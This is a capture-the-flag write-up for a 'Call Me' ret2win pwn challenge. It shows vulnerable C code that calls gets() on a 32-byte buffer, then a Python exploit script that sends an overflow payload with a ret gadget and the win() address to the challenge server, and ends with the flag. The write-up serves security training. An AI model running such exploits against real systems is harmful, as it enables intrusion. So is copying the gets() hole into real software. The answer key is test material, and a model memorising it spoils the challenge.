---
title: "Call Me — ret2win"
type: "writeup"
section: "writeups"
status: "published"
author: "asep"
tags: ["gemastik", "ctf", "warmup", "pwn"]
path: "writeups/gemastik-2026-warmup/ch10-call-me.md"
created_at: "2026-08-21T07:25:43.282Z"
updated_at: "2026-08-21T07:25:43.282Z"
event: "GEMASTIK 2026 Warmup"
challenge: "Call Me — ret2win"
category: "pwn"
points: 500
difficulty: "easy"
flag: "GEMASTIK19{r3t2w1n_l0mpat_k3_win}"
---
# Call Me (500 pts) — Pwn / ret2win

**Server:** `nc 15.232.89.109 9002`

**Source (`chall.c`):**

```c
void win() { system("/bin/sh"); }  // flag printed inside

char buf[32];
gets(buf);                          // <-- overflow
```

## Eksploitasi

1. Compile lokal untuk dapatkan alamat `win()`:
```bash
gcc -fno-stack-protector -no-pie -o ch10 chall.c
nm ch10 | grep win
# 00000000004011f6 T win
```

2. Overflow `buf[32]` lalu timpa return address dengan alamat `win()` (0x4011f6).
   Sisipkan satu `ret` gadget (0x401016) untuk realign RSP agar `movaps` di `win`/`printf` tidak segfault:

```python
import socket, time, struct

s = socket.socket()
s.connect(("15.232.89.109", 9002))
time.sleep(0.5)

RET_GADGET = 0x401016   # alignment
WIN_ADDR = 0x4011f6

payload = b"A" * 32 + b"B" * 8 + struct.pack("<Q", RET_GADGET) + struct.pack("<Q", WIN_ADDR)
s.sendall(payload + b"\n")
time.sleep(1.5)
print(s.recv(4096).decode())
# -> GEMASTIK19{r3t2w1n_l0mpat_k3_win}
```

## Flag

`GEMASTIK19{r3t2w1n_l0mpat_k3_win}`